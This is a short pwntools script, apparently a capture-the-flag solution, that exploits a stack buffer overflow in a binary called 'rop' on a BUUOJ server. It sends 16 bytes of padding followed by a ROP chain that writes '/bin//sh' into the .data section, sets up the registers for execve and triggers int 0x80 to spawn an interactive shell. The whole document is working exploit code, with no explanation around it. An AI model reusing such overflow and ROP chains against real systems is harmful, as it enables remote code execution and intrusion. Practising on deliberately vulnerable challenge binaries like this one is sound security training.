from pwn import *
#r=process("./rop")
r=remote("node4.buuoj.cn",27128)
elf=ELF("rop")
overflow_addr=elf.sym['overflow']
p = b'a'*16

p +=p32(0x0806ecda) # pop edx ; ret
p +=p32(0x080ea060) # @ .data
p +=p32(0x080b8016) # pop eax ; ret
p += b'/bin'
p +=p32(0x0805466b) # mov dword ptr [edx], eax ; ret
p +=p32(0x0806ecda) # pop edx ; ret
p +=p32(0x080ea064) # @ .data + 4
p +=p32(0x080b8016) # pop eax ; ret
p += b'//sh'
p +=p32(0x0805466b) # mov dword ptr [edx], eax ; ret
p +=p32(0x0806ecda) # pop edx ; ret
p +=p32(0x080ea068) # @ .data + 8
p +=p32(0x080492d3) # xor eax, eax ; ret
p +=p32(0x0805466b) # mov dword ptr [edx], eax ; ret
p +=p32(0x080481c9) # pop ebx ; ret
p +=p32(0x080ea060) # @ .data
p +=p32(0x080de769) # pop ecx ; ret
p +=p32(0x080ea068) # @ .data + 8
p +=p32(0x0806ecda) # pop edx ; ret
p +=p32(0x080ea068) # @ .data + 8
p +=p32(0x080492d3) # xor eax, eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0807a66f) # inc eax ; ret
p +=p32(0x0806c943) # int 0x80


r.send(p)
r.interactive()